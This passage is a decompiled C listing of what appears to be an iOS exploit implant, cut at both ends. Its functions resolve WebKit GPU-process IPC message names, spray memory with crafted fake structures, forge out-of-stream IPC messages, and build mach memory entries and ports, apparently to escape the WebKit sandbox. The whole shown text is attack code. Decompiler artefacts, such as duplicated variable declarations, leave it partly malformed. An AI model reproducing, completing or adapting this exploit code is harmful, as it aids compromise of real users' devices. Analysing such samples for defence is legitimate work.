                              if (err != 0xffff) {
                                err = coruna_implant6dec_str_invalid_message_name(size,"RemoteDevice_CreateQuerySet");
                                *(short *)(handle + 0x13a) = (short)err;
                                if (err != 0xffff) {
                                  err = coruna_implant6dec_str_invalid_message_name(size,"RemoteDevice_ImportExternalTexture");
                                  *(short *)(handle + 0x13e) = (short)err;
                                  if (err != 0xffff) {
                                    u = coruna_implant6dec_str_invalid_message_name(size,
                                                  "GPUConnectionToWebProcess_SetNowPlayingInfo");
                                    *(uint16_t *)(handle + 0x142) = u;
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_difftime(long handle)
{
  uint32_t u;
  int err;
  int status;
  time_t lt4;
  time_t lt5;
  double ld6;
  
  err = coruna_implant6dec_via_u64_pack_3();
  if (err == 0) {
    coruna_mach_msg(handle,2);
    lt4 = _time((time_t *)0x0);
    u = k_implant_float_const_001;
    do {
      if (*(int *)(handle + 0x10) != 0) {
        err = coruna_semaphore_timedwait_e674(0x4a000000,0x40000000,0x3f800000,handle,
                             *(uint64_t *)(handle + 0x30),0,0,0,1,&k_implant_ctx_slot_primary);
        if (err != 0) {
          return;
        }
        err = 3000;
        do {
          *(long *)(handle + 0x70) = *(long *)(handle + 0x70) + 1;
          status = coruna_semaphore_timedwait_e674(0x3f800000,0x40000000,0x3f800000,handle,
                               *(uint64_t *)(handle + 0x30),0,0,0,1);
          if (status != 0) {
            return;
          }
          err = err + -1;
        } while (err != 0);
        coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x158),handle);
      }
      coruna_nanosleep(u);
      lt5 = _time((time_t *)0x0);
      ld6 = _difftime(lt5,lt4);
    } while (ld6 < 2.0);
  }
  return;
}
void coruna_implant6dec_via_semaphore_timedwait_f060(long handle)
{
  int err;
  int status;
  uint u;
  long handle;
  
  handle = 0;
  while( true ) {
    err = coruna_semaphore_timedwait_e9b0(handle,2,1,34000000,handle + *(long *)(handle + 0x68));
    if (err != 0) {
      return;
    }
    err = coruna_implant6dec_via_semaphore_signal_2(handle,handle + *(long *)(handle + 0x68),2,0,8);
    if (err != 0) break;
    handle = handle + 1;
    if (handle == 0x51) {
      err = 55000;
      do {
        handle = *(long *)(handle + 0x70) + 1;
        *(long *)(handle + 0x70) = handle;
        status = coruna_semaphore_timedwait_f060(handle,handle,0);
        if (status != 0) {
          return;
        }
        err = err + -1;
      } while (err != 0);
      err = 55000;
      do {
        handle = *(long *)(handle + 0x70) + 1;
        *(long *)(handle + 0x70) = handle;
        status = coruna_semaphore_timedwait_f1cc(handle,handle,0);
        if (status != 0) {
          return;
        }
        err = err + -1;
      } while (err != 0);
      u = 0;
      do {
        handle = *(long *)(handle + 0x70) + 1;
        *(long *)(handle + 0x70) = handle;
        err = coruna_semaphore_timedwait_f338(handle,handle,10000 < u);
        if (err != 0) {
          return;
        }
        u = u + 1;
      } while (u != 20000);
      coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x160),handle,*(uint64_t *)(handle + 0x30),
                   0xbadf00d,8,*(uint32_t *)(handle + 0xd8),0,10,0x14,0x280000001e);
    }
  }
  return;
}
void coruna_implant6dec_via_semaphore_timedwait_ebbc(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint64_t *ptr;
  uint u;
  uint64_t size;
  bool err;
  int err;
  void *ptr;
  long handle;
  long addr;
  int status;
  unsigned long version;
  
  ptr = _calloc(1,0x4070000);
  size = k_implant_reloc_tag_a;
  handle = (long)ptr + 0x2070080;
  version = 0x2070000;
  do {
    addr = 0;
    ptr = (uint64_t *)((long)ptr + version);
    *ptr = size;
    ptr[2] = 0x280000008;
    ptr[1] = 0x280000008;
    ptr[4] = 0x280000008;
    ptr[3] = 0x280000008;
    ptr[6] = 0x280000008;
    ptr[5] = 0x280000008;
    ptr[8] = 0x280000008;
    ptr[7] = 0x280000008;
    ptr[10] = 0x280000008;
    ptr[9] = 0x280000008;
    ptr[0xc] = 0x280000008;
    ptr[0xb] = 0x280000008;
    do {
      ptr = (uint64_t *)(handle + addr);
      *ptr = 0x280000008;
      ptr[1] = 0xffffffffffffffff;
      ptr[2] = id_2;
      ptr[3] = 2;
      ptr[4] = 0x280000008;
      ptr[5] = 0xffffffffffffffff;
      ptr[6] = id_2;
      ptr[7] = 2;
      addr = addr + 0x40;
    } while (addr != 0xf80);
    handle = handle + 0x1000;
    err = version < 0x406f000;
    version = version + 0x1000;
  } while (err);
  u = *(int *)(handle + 0x78) << 3;
  version = (unsigned long)u;
  if ((u == 0) ||
     (err = coruna_implant6dec_via_semaphore_signal_2(handle,*(long *)(handle + 0x68) + 0x50,2,version,8), err == 0)) {
    err = coruna_semaphore_timedwait_ebbc(handle,*(long *)(handle + 0x68) + 0x50,(long)ptr + version,
                         0x4070000 - version);
    _free(ptr);
    if (err == 0) {
      status = (int)size_3;
      err = status + 3;
      if (-1 < status) {
        err = status;
      }
      coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x168),handle,*(uint64_t *)(handle + 0x30),
                   &k_implant_ctx_slot_primary,0,err >> 2,1,val,size_3,0,status);
    }
  }
  return;
}
void coruna_implant6dec_via_vm_deallocate(long handle)
{
  uint16_t *ptr;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *ptr = 1;
  ptr[1] = *(uint16_t *)(handle + 0x126);
  *(uint32_t *)(ptr + 2) = 0;
  u = *(uint64_t *)(handle + 0x48);
  *(uint64_t *)(ptr + 4) = 0;
  *(uint64_t *)(ptr + 8) = u;
  u = *(uint64_t *)(handle + 0xc0);
  *(uint64_t *)(ptr + 0xc) = *(uint64_t *)(handle + 0x30);
  *(uint64_t *)(ptr + 0x10) = u;
  *(uint64_t *)(ptr + 0x14) = u;
  scratch[0] = 1;
  bootargs = *(uint32_t *)(handle + 0xd0);
  thread_attr = k_implant_reloc_tag_b;
  coruna_vm_deallocate(ptr,ptr,0x30,scratch,&bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_semaphore_timedwait_c9e4(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint32_t size,
                 uint8_t buf,uint32_t flags_2,uint32_t version_3,uint64_t val)
{
  unsigned long u;
  uint64_t size;
  kern_return_t lk3;
  unsigned long *ptr;
  uint32_t scratch[2];
  uint32_t bootargs[2];
  uint32_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x136);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  ptr[4] = val;
  *(uint8_t *)(ptr + 5) = 0;
  *(uint8_t *)((long)ptr + 0x29) = buf;
  *(uint8_t *)((long)ptr + 0x2a) = 0;
  *(uint32_t *)((long)ptr + 0x2c) = 0;
  ptr[6] = 0x11;
  *(uint8_t *)(ptr + 9) = 0x42;
  size = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  ptr[8] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  ptr[7] = size;
  *(uint32_t *)((long)ptr + 0x49) = flags_2;
  *(uint32_t *)((long)ptr + 0x4d) = version_3;
  *(uint8_t *)((long)ptr + 0x51) = (uint8_t)val;
  *(long *)((long)ptr + 0x55) = (long)val._4_4_;
  scratch[0] = 1;
  thread_attr = 0x130000;
  bootargs[0] = size;
  coruna_vm_deallocate(ptr,ptr,0x59,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  *(uint64_t *)((long)ptr + 0x12) = 0;
  *(uint64_t *)((long)ptr + 10) = 0;
  *(uint64_t *)((long)ptr + 0x22) = 0;
  *(uint64_t *)((long)ptr + 0x1a) = 0;
  *(uint64_t *)((long)ptr + 0x32) = 0;
  *(uint64_t *)((long)ptr + 0x2a) = 0;
  *(uint64_t *)((long)ptr + 0x42) = 0;
  *(uint64_t *)((long)ptr + 0x3a) = 0;
  *(uint64_t *)((long)ptr + 0x51) = 0;
  *(uint64_t *)((long)ptr + 0x49) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(ptr + 1) = 0;
  coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 10,ptr,10,1,handle,
               *(uint64_t *)(handle + 0xf8));
  lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk3 != 0x31) {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 10;
    _free(ptr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_semaphore_timedwait_cbbc(long handle,uint64_t val,unsigned long arg,uint8_t buf,uint size,
                 uint flags_2,void *ctx,size_t len,uint64_t id_2,uint64_t size_3,
                 uint64_t off_4,byte arg_x)
{
  size_t ls1;
  unsigned long *ptr;
  uint32_t *buf;
  uint u;
  semaphore_t ls5;
  uint64_t size;
  kern_return_t lk7;
  unsigned long *str;
  long handle;
  long addr;
  unsigned long version;
  uint64_t *copy;
  
  str = _malloc(len + 0x1000);
  if (*(int *)(handle + 0x78) == 0) {
    *(uint *)str = (uint)*(ushort *)(handle + 0x120);
    *(uint64_t *)((long)str + 6) = val;
    handle = *(long *)(handle + 0x20);
    copy = *(uint64_t **)(handle + 0xf8);
    addr = 0x18;
    if (*(uint64_t **)(handle + 200) != copy) {
      addr = 0x10;
    }
    ls5 = *(semaphore_t *)(handle + addr);
    *copy = 0x80000000;
    *(long *)((long)copy + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0xe;
    ptr = (unsigned long *)((long)copy + handle + (unsigned long)*(uint *)(handle + 0x150));
    version = *str;
    *(uint64_t *)((long)ptr + 6) = *(uint64_t *)((long)str + 6);
    *ptr = version;
    lk7 = _semaphore_signal(ls5);
    if (lk7 == 0) {
      *(uint64_t *)((long)str + 6) = 0;
      *str = 0;
    }
    lk7 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
    if (lk7 == 0x31) {
      return;
    }
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0xe;
  }
  *str = (unsigned long)*(ushort *)(handle + 0x138);
  str[1] = arg;
  *(uint8_t *)(str + 2) = 0;
  *(uint8_t *)((long)str + 0x11) = buf;
  *(uint8_t *)((long)str + 0x12) = 0;
  *(uint *)((long)str + 0x14) = 0;
  str[3] = 0x11;
  *(uint8_t *)(str + 6) = 0x42;
  size = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  str[5] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  str[4] = size;
  *(uint *)((long)str + 0x34) = size;
  *(uint *)(str + 7) = flags_2;
  if (len == 0) {
    addr = 0x3c;
  }
  else {
    _memcpy((uint *)((long)str + 0x3c),ctx,len);
    addr = len + 0x3c;
  }
  buf = (uint32_t *)((long)str + addr);
  *buf = (uint32_t)id_2;
  buf[1] = id_2._4_4_;
  buf[2] = (uint32_t)size_3;
  buf[3] = size_3._4_4_;
  buf[4] = (uint32_t)off_4;
  buf[5] = off_4._4_4_;
  *(ushort *)(buf + 6) = (ushort)arg_x;
  ls1 = addr + 0x1a;
  handle = *(long *)(handle + 0x20);
  copy = *(uint64_t **)(handle + 0xf8);
  addr = 0x18;
  if (*(uint64_t **)(handle + 200) != copy) {
    addr = 0x10;
  }
  ls5 = *(semaphore_t *)(handle + addr);
  *copy = 0x80000000;
  u = *(uint *)(handle + 0x150);
  *(size_t *)((long)copy + (unsigned long)*(uint *)(handle + 0x14c)) = handle + ls1;
  _memcpy((void *)((long)copy + handle + (unsigned long)u),str,ls1);
  lk7 = _semaphore_signal(ls5);
  if (lk7 == 0) {
    _bzero(str,ls1);
  }
  lk7 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk7 != 0x31) {
    *(size_t *)(handle + 0x20) = *(long *)(handle + 0x20) + ls1;
    _free(str);
  }
  return;
}
void coruna_implant6dec_str_system_library_frameworks_webkit_framework_webk_2(long handle)
{
  uint16_t u;
  int err;
  uint64_t size;
  
  size = coruna_dyld_shared_cache_file_path("/System/Library/Frameworks/WebKit.framework/WebKit",
                       "__ZN3IPC11descriptionENS_11MessageNameE");
  size = coruna_implant6dec_via_pacia_3(size,0);
  err = coruna_ret_stub(size,"Terminate");
  *(short *)(handle + 0x140) = (short)err;
  if (err != 0xffff) {
    err = coruna_ret_stub(size,"SetStreamDestinationID");
    *(short *)(handle + 0x120) = (short)err;
    if (err != 0xffff) {
      err = coruna_ret_stub(size,"ProcessOutOfStreamMessage");
      *(short *)(handle + 0x122) = (short)err;
      if (err != 0xffff) {
        err = coruna_ret_stub(size,"GPUConnectionToWebProcess_CreateRenderingBackend");
        *(short *)(handle + 0x124) = (short)err;
        if (err != 0xffff) {
          err = coruna_ret_stub(size,"GPUConnectionToWebProcess_CreateRemoteGPU");
          *(short *)(handle + 0x126) = (short)err;
          if (err != 0xffff) {
            err = coruna_ret_stub(size,"RemoteGPU_RequestAdapter");
            *(short *)(handle + 0x128) = (short)err;
            if (err != 0xffff) {
              err = coruna_ret_stub(size,"RemoteAdapter_RequestDevice");
              *(short *)(handle + 0x12a) = (short)err;
              if (err != 0xffff) {
                err = coruna_ret_stub(size,"RemoteDevice_CreateBuffer");
                *(short *)(handle + 300) = (short)err;
                if (err != 0xffff) {
                  err = coruna_ret_stub(size,"RemoteBuffer_MapAsync");
                  *(short *)(handle + 0x12e) = (short)err;
                  if (err != 0xffff) {
                    err = coruna_ret_stub(size,"RemoteBuffer_Unmap");
                    *(short *)(handle + 0x130) = (short)err;
                    if (err != 0xffff) {
                      err = coruna_ret_stub(size,"RemoteRenderingBackend_CreateImageBuffer");
                      *(short *)(handle + 0x132) = (short)err;
                      if (err != 0xffff) {
                        err = coruna_ret_stub(size,
                                             "RemoteRenderingBackend_GetPixelBufferForImageBuffer");
                        *(short *)(handle + 0x134) = (short)err;
                        if (err != 0xffff) {
                          err = coruna_ret_stub(size,
                                               "RemoteRenderingBackend_GetPixelBufferForImageBufferWithNewMemory"
                                              );
                          *(short *)(handle + 0x136) = (short)err;
                          if (err != 0xffff) {
                            err = coruna_ret_stub(size,
                                                 "RemoteRenderingBackend_PutPixelBufferForImageBuffer"
                                                );
                            *(short *)(handle + 0x138) = (short)err;
                            if (err != 0xffff) {
                              err = coruna_ret_stub(size,"RemoteDevice_CreateQuerySet");
                              *(short *)(handle + 0x13a) = (short)err;
                              if (err != 0xffff) {
                                u = coruna_ret_stub(size,
                                                  "GPUConnectionToWebProcess_SetNowPlayingInfo");
                                *(uint16_t *)(handle + 0x142) = u;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_difftime_d064(long handle)
{
  uint32_t u;
  int err;
  time_t lt3;
  time_t lt4;
  double ld5;
  
  err = coruna_implant6dec_via_u64_pack_3();
  if (err == 0) {
    coruna_mach_msg(handle,2);
    lt3 = _time((time_t *)0x0);
    u = k_implant_float_const_001;
    do {
      if (*(int *)(handle + 0x10) != 0) {
        err = coruna_semaphore_timedwait_e674(0x4a000000,0x40000000,0x3f800000,handle,
                             *(uint64_t *)(handle + 0x30),0,0,0,1,&k_implant_ctx_slot_primary);
        if (err != 0) {
          return;
        }
        coruna_dispatch_source_set_event_handler(handle);
        coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x158),handle);
      }
      coruna_nanosleep(u);
      lt4 = _time((time_t *)0x0);
      ld5 = _difftime(lt4,lt3);
    } while (ld5 < 2.0);
  }
  return;
}
void coruna_sysctlbyname_d1b4(long handle)
{
  uint u;
  int err;
  long handle;
  unsigned long size;
  size_t scratch;
  uint32_t bootargs;
  uint64_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  long thread_attr;
  
  handle = 0;
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  do {
    err = coruna_semaphore_timedwait_e9b0(handle,2,1,34000000,handle + *(long *)(handle + 0x68));
    if ((err != 0) ||
       (err = coruna_implant6dec_via_semaphore_signal_2(handle,handle + *(long *)(handle + 0x68),2,0,8), err != 0))
    goto fail;
    handle = handle + 1;
  } while (handle != 0x4c);
  bootargs = 0;
  thread_attr = 0;
  bootargs = 0;
  scratch = 0;
  serial_buf = 0;
  host_info = 0;
  scratch = 0x20;
  err = _sysctlbyname("hw.product",&bootargs,&scratch,(void *)0x0,0);
  if (err != -1) {
    size = 0;
    u = 100000;
    if (coruna_cat(scratch,bootargs) != 0x3031656e6f685069 ||
        coruna_cat(bootargs,scratch) != 0x312c3031656e6f) {
      u = 120000;
    }
    while (err = coruna_semaphore_timedwait_f4a0(handle,size + *(long *)(handle + 0x70),u - 100 < size),
          err == 0) {
      size = size + 1;
      if (u == size) {
        coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x160),handle,*(uint64_t *)(handle + 0x30),
                     0xbadf00d,8,*(uint32_t *)(handle + 0xd8),0,10,0x14,0x280000001e);
      }
    }
fail:
    err = 5;
  }
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail(err);
}
void coruna_implant6dec_via_semaphore_timedwait_ebbc_2(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint64_t *ptr;
  uint u;
  uint64_t size;
  uint64_t version;
  bool err;
  int err;
  void *ptr;
  long handle;
  unsigned long port;
  int status;
  unsigned long tag;
  long addr;
  
  addr = 0x2070040;
  ptr = _calloc(1,0x4070000);
  version = k_implant_reloc_tag_c;
  size = k_implant_reloc_tag_a;
  handle = 0x2070050;
  tag = 0x2070000;
  do {
    port = 0;
    ptr = (uint64_t *)((long)ptr + tag);
    *ptr = size;
    ptr[2] = 0x280000008;
    ptr[1] = 0x280000008;
    ptr[4] = 0x280000008;
    ptr[3] = 0x280000008;
    do {
      *(uint64_t *)((long)ptr + port + addr) = version;
      *(uint64_t *)((long)ptr + port + handle + -8) = 0xffffffffffffffff;
      *(uint64_t *)((long)ptr + port + handle) = id_2;
      *(uint64_t *)((long)ptr + port + handle + 8) = 2;
      port = port + 0x20;
    } while (port < 0xfa8);
    handle = handle + 0x1000;
    addr = addr + 0x1000;
    err = tag < 0x406f000;
    tag = tag + 0x1000;
  } while (err);
  coruna_nanosleep(k_implant_float_const_01);
  u = *(int *)(handle + 0x78) << 3;
  tag = (unsigned long)u;
  if ((u == 0) ||
     (err = coruna_implant6dec_via_semaphore_signal_2(handle,*(long *)(handle + 0x68) + 0x4b,2,tag,8), err == 0)) {
    err = coruna_semaphore_timedwait_ebbc(handle,*(long *)(handle + 0x68) + 0x4b,(long)ptr + tag,
                         0x4070000 - tag);
    _free(ptr);
    if (err == 0) {
      status = (int)size_3;
      err = status + 3;
      if (-1 < status) {
        err = status;
      }
      coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x168),handle,*(uint64_t *)(handle + 0x30),
                   &k_implant_ctx_slot_primary,0,err >> 2,1,val,size_3,0,status);
    }
  }
  return;
}
void coruna_semaphore_timedwait_d5a4(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint32_t size,
                 uint8_t buf,uint32_t flags_2,uint32_t version_3,uint64_t val)
{
  unsigned long u;
  uint64_t size;
  kern_return_t lk3;
  unsigned long *ptr;
  uint32_t scratch[2];
  uint32_t bootargs[2];
  uint32_t thread_attr;
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x136);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  ptr[4] = val;
  ptr[5] = val;
  *(uint8_t *)(ptr + 6) = 0;
  *(uint8_t *)((long)ptr + 0x31) = buf;
  *(uint8_t *)((long)ptr + 0x32) = 0;
  *(uint32_t *)((long)ptr + 0x34) = 0;
  ptr[7] = 0x11;
  *(uint8_t *)(ptr + 10) = 0x42;
  size = s_kCGColorSpaceSRGB_00013e5a._0_8_;
  ptr[9] = s_kCGColorSpaceSRGB_00013e5a._8_8_;
  ptr[8] = size;
  *(uint32_t *)((long)ptr + 0x51) = flags_2;
  *(uint32_t *)((long)ptr + 0x55) = version_3;
  *(uint8_t *)((long)ptr + 0x59) = (uint8_t)val;
  *(long *)((long)ptr + 0x5d) = (long)val._4_4_;
  scratch[0] = 1;
  thread_attr = 0x130000;
  bootargs[0] = size;
  coruna_vm_deallocate(ptr,ptr,0x61,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  *(uint64_t *)((long)ptr + 0x12) = 0;
  *(uint64_t *)((long)ptr + 10) = 0;
  *(uint64_t *)((long)ptr + 0x22) = 0;
  *(uint64_t *)((long)ptr + 0x1a) = 0;
  *(uint64_t *)((long)ptr + 0x32) = 0;
  *(uint64_t *)((long)ptr + 0x2a) = 0;
  *(uint64_t *)((long)ptr + 0x42) = 0;
  *(uint64_t *)((long)ptr + 0x3a) = 0;
  *(uint64_t *)((long)ptr + 0x52) = 0;
  *(uint64_t *)((long)ptr + 0x4a) = 0;
  *(uint64_t *)((long)ptr + 0x59) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  *(uint16_t *)(ptr + 1) = 0;
  coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 10,ptr,10,1,handle,
               *(uint64_t *)(handle + 0xf8));
  lk3 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk3 != 0x31) {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 10;
    _free(ptr);
  }
  if (*(long *)k_implant_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_ret_stub(void)
{
  coruna_implant6dec_via_pacia_3_3(0x2000);
}
void coruna_implant6dec_str_invalid_message_name(char *path,char *str_2)
{
  int err;
  size_t ls2;
  
  err = _strcmp(path,str_2);
  while ((err != 0 && (err = _strcmp(path,"<invalid message name>"), err != 0))) {
    ls2 = _strlen(path);
    path = path + ls2 + 1;
    err = _strcmp(path,str_2);
  }
  return;
}
void coruna_nanosleep(float arg)
{
  int err;
  timespec scratch;
  timespec bootargs;
  
  bootargs.tv_sec = (__darwin_time_t)arg;
  bootargs.tv_nsec = (long)((arg - (float)bootargs.tv_sec) * k_implant_float_const_pack);
  err = _nanosleep(&bootargs,&scratch);
  if (err == -1) {
    _nanosleep(&scratch,(timespec *)0x0);
  }
  return;
}
void coruna_dlerror(long handle)
{
  uint64_t u;
  long handle;
  
  _dlerror();
  if (*(short *)(handle + 0x140) == 0) {
    coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(handle + 0x170),handle);
  }
  handle = *(long *)(handle + 0x90);
  if (handle == 0) {
    handle = coruna_dyld_shared_cache_file_path("/System/Library/Frameworks/WebKit.framework/WebKit",
                         "__ZN6WebKit10WebProcess9singletonEv");
    if (handle == 0) {
      return;
    }
    handle = coruna_implant6dec_via_pacia_3(handle,0);
    *(long *)(handle + 0x90) = handle;
  }
  if (*(long *)(handle + 0x98) == 0) {
    handle = coruna_dyld_shared_cache_file_path(handle,"/System/Library/Frameworks/WebKit.framework/WebKit",
                         "__ZN6WebKit10WebProcess26ensureGPUProcessConnectionEv");
    if (handle == 0) {
      return;
    }
    u = coruna_implant6dec_via_pacia_3(handle,0);
    *(uint64_t *)(handle + 0x98) = u;
    handle = *(long *)(handle + 0x90);
  }
  coruna_implant6dec_via_pacia_3_3(handle);
}





void coruna_ret_stub_2(long handle)
{
  coruna_implant6dec_via_pacia_3_3(*(uint64_t *)(*(long *)(handle + 0x20) + 0x80));
}
void coruna_implant6dec_via_dlerror(uint32_t *size)
{
  int err;
  long handle;
  
  err = coruna_dlerror();
  if (err == 0) {
    handle = *(long *)(*(long *)(size + 0x22) + *(long *)(size + 0x28));
    size[1] = *(uint32_t *)(handle + *(long *)(size + 0x2a));
    if (size[0x52] != 0x100400) {
      *size = *(uint32_t *)(handle + *(long *)(size + 0x2c));
      *(long *)(size + 2) = handle + *(long *)(size + 0x2e);
    }
    *(uint64_t *)(size + 0x46) = *(uint64_t *)(*(long *)(size + 0x20) + 0x100);
  }
  return;
}
void coruna_mach_make_memory_entry_64(mach_port_name_t *arg)
{
  mach_port_name_t name;
  uint8_t *ptr;
  int err;
  uint u;
  kern_return_t lk4;
  time_t lt5;
  unsigned long size;
  FILE *tmp_pF7;
  memory_object_size_t *size;
  long handle;
  
  err = coruna_implant6dec_via_dlerror();
  if (err == 0) {
    size = (memory_object_size_t *)(arg + 0x30);
    *size = 0x8000000;
    *(memory_object_size_t *)(arg + 0x3c) = 0x8000000;
    lt5 = _time((time_t *)0x0);
    _srand((uint)lt5);
    u = _rand();
    size = (unsigned long)((u & 0xff) + 2);
    *(unsigned long *)(arg + 0xc) = size;
    handle = size + k_implant_vtable_tag_a;
    *(unsigned long *)(arg + 0x10) = size + k_implant_rodata_word_00012b68;
    *(long *)(arg + 0xe) = handle;
    handle = size + k_implant_vtable_tag_b;
    *(unsigned long *)(arg + 0x14) = size + k_implant_rodata_word_00012b78;
    *(long *)(arg + 0x12) = handle;
    handle = size + k_implant_map_size_bias;
    *(unsigned long *)(arg + 0x18) = size + k_implant_rodata_word_00012b88;
    *(long *)(arg + 0x16) = handle;
    *(unsigned long *)(arg + 0x1a) = size + 7;
    *(unsigned long *)(arg + 0x1c) = size + 7;
    ptr = k_implant_mach_task_self_slot;
    lk4 = _mach_vm_allocate(*(vm_map_t *)k_implant_mach_task_self_slot,
                              (mach_vm_address_t *)(arg + 0x32),*size,3);
    if (lk4 == 0) {
      _bzero(*(void **)(arg + 0x32),*(size_t *)(arg + 0x30));
      lk4 = _mach_vm_allocate(*(vm_map_t *)ptr,(mach_vm_address_t *)(arg + 0x3e),
                                *(mach_vm_size_t *)(arg + 0x3c),3);
      if (lk4 == 0) {
        _bzero(*(void **)(arg + 0x3e),*(size_t *)(arg + 0x3c));
        lk4 = _mach_make_memory_entry_64
                          (*(vm_map_t *)ptr,size,*(memory_object_offset_t *)(arg + 0x32),
                           0x500043,arg + 0x34,0);
        if ((lk4 == 0) &&
           (lk4 = _mach_make_memory_entry_64
                              (*(vm_map_t *)ptr,(memory_object_size_t *)(arg + 0x3c),
                               *(memory_object_offset_t *)(arg + 0x3e),0x500043,arg + 0x40,0
                              ), lk4 == 0)) {
          *(memory_object_size_t *)(arg + 0x3a) = 0x1000;
          lk4 = _mach_vm_allocate(*(vm_map_t *)ptr,(mach_vm_address_t *)(arg + 0x38),0x1000
                                    ,3);
          if ((lk4 == 0) &&
             (lk4 = _mach_make_memory_entry_64
                                (*(vm_map_t *)ptr,(memory_object_size_t *)(arg + 0x3a),
                                 *(memory_object_offset_t *)(arg + 0x38),0x400043,arg + 0x36
                                 ,0), lk4 == 0)) {
            lk4 = _mach_port_allocate(*(ipc_space_t *)ptr,1,arg + 0x41);
            if (((lk4 == 0) &&
                (name = arg[0x41],
                lk4 = _mach_port_insert_right(*(ipc_space_t *)ptr,name,name,0x14), lk4 == 0))
               && (arg[0x52] == 0x100400)) {
              lk4 = _mach_port_allocate(*(ipc_space_t *)ptr,1,arg);
              if (lk4 == 0) {
                lk4 = _mach_port_insert_right(*(ipc_space_t *)ptr,*arg,*arg,0x14);
                if (lk4 != 0) {
                  tmp_pF7 = *(FILE **)k_implant_stderrp_slot;
                  _mach_error_string(lk4);
                  _fprintf(tmp_pF7,"[-] Could not insert port right into mach port, error %x: %s");
                }
              }
              else {
                tmp_pF7 = *(FILE **)k_implant_stderrp_slot;
                _mach_error_string(lk4);
                _fprintf(tmp_pF7,"[-] Could not allocate mach port, error %x: %s");
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_mach_port_destroy(mach_port_name_t *arg)
{
  uint8_t *ptr;
  
  ptr = k_implant_mach_task_self_slot;
  _vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,*(vm_address_t *)(arg + 0x32),
                 *(vm_size_t *)(arg + 0x30));
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(arg + 0x3e),
                 *(vm_size_t *)(arg + 0x3c));
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(arg + 0x38),
                 *(vm_size_t *)(arg + 0x3a));
  _semaphore_destroy(*(task_t *)ptr,arg[7]);
  _semaphore_destroy(*(task_t *)ptr,arg[5]);
  _semaphore_destroy(*(task_t *)ptr,arg[6]);
  _semaphore_destroy(*(task_t *)ptr,arg[4]);
  _mach_port_destroy(*(ipc_space_t *)ptr,arg[0x41]);
  _mach_port_destroy(*(ipc_space_t *)ptr,arg[0x42]);
  _mach_port_destroy(*(ipc_space_t *)ptr,arg[0x35]);
  if (arg[0x52] == 0x100400) {
    _mach_port_destroy(*(ipc_space_t *)ptr,*arg);
  }
  arg[0x50] = 0;
  arg[0x51] = 0;
  arg[0x4a] = 0;
  arg[0x4b] = 0;
  arg[0x48] = 0;
  arg[0x49] = 0;
  arg[0x4e] = 0;
  arg[0x4f] = 0;
  arg[0x4c] = 0;
